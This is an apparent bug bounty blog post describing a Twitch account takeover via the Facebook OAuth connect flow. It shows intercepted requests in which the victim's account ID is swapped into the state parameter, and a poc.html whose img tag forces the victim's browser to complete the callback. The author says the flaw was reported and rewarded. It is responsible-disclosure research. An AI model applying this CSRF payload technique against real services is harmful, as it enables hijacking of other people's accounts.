+++
date = '2025-02-01T12:06:32+03:00'
draft = false
title = 'Twitch.tv Account Takeover'
hideSummary= true
+++



One day I was bored after watching livestreams, I made a decision to check for security flaws on Twitch website.
So I made two accounts. 

- ```Attacker``` 
- ```Victim``` 

I noticed there is a ```login with Facebook``` feature,to activate the login with Facebook feature, user must either use Facebook Connect in Settings or Sign up with Facebook. 
So I tried Facebook Connect feature in settings
![Facebook Connect](/img/twitch-1.png) 
 
This is a GET request that I intercepted in Burpsuite after using connect button. 

```
GET /v5/facebook/44XXXXXXX/auth HTTP/1.1
Host: api.twitch.tv
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Cookie: [REDACTED]
```
response to this query will be a 302 redirect to start Facebook oauth flow

```
GET /dialog/oauth?client_id=161273083968709&redirect_uri=https%3A%2F%2Fapi.twitch.tv%2Fv5%2Ffacebook%2Fcallback&response_type=code&scope=email&state=facebook%3Aoslt3lyobywdv5ns3syopp7porcci34e%3A44XXXXXXX HTTP/1.1
Host: www.facebook.com
```

and the user must sign in to his Facebook account and give Twitch permission to sucessfully connect his account to that particular Facebook account. 

At last this callback request was made to api.twitch.tv to complete facebook connect oauth flow.

```
GET /v5/facebook/callback?code=AQDqj[REDACTED]&state=facebook%3Aoslt3lyobywdv5ns3syopp7porcci34e%3A444XXXXXXX HTTP/1.1
Host: api.twitch.tv
```
![Facebook Connected](/img/twitch-2.png)
now that Facebook account is connected to the user’s account. 

![User's flow](/img/twitch-3.png)

During this Facebook OAuth flow, I discovered an account ID being sent and utilized in a state parameter.

I was able to obtain the account IDs of both the attacker and the victim, which can be obtained by visiting user's profile.

- ```44XXXXXXX``` Attacker
- ```45YYYYYYY``` Victim

I followed the same Facebook connect flow in the attacker session, but this time I replaced the victim’s account ID with the attacker’s account ID. 

```
GET /v5/facebook/45YYYYYYY/auth HTTP/1.1
Host: api.twitch.tv
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Cookie: [REDACTED]
```

In order to obtain my attacker's Facebook account authorization code, I intercepted and dropped this oauth callback request after forwarding to authorize attacker's Facebook account.


```
GET /v5/facebook/callback?code=AQDqj[REDACTED]&state=facebook%3Aoslt3lyobywdv5ns3syopp7porcci34e%3A45YYYYYYY HTTP/1.1
Host: api.twitch.tv
```

I created a decent proof of concept by embedding callback request in an IMG SRC tag in the following HTML code.
>poc.html
``` 
<html>
<body>
<img src="https://api.twitch.tv/v5/facebook/callback?code=AQDqj[REDACTED]8&state=facebook%3Aoslt3lyobywdv5ns3syopp7porcci34e%3A45YYYYYYY">
</body>
</html>
``` 
![Attacker's flow](/img/twitch-4.png)

When user opens that ```poc.html``` in the browser session, the attacker can use his Facebook account to log into the victim's Twitch account. 

### Video POC
{{< video src="/video/twitch.MOV" >}}


- I reported this issue to Twitch, and they rewarded me with $XXXX


